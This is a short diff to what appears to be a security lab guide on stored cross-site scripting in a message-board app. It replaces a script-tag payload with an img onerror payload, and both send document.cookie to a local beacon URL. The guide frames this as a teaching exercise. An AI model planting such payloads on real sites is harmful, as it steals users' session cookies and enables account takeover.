@@ -16,7 +16,7 @@ Post this as a new message-board entry through the real app — you're
 planting it yourself, as a normal logged-in user, not via CSRF:
 
 ```html
-<script>new Image().src = 'http://127.0.0.1:5000/beacon.png?c=' + encodeURIComponent(document.cookie);</script>
+<img src="x" onerror="new Image().src = 'http://127.0.0.1:5000/beacon.png?c=' + encodeURIComponent(document.cookie);">
 ```
 
 ## Watch the attack succeed
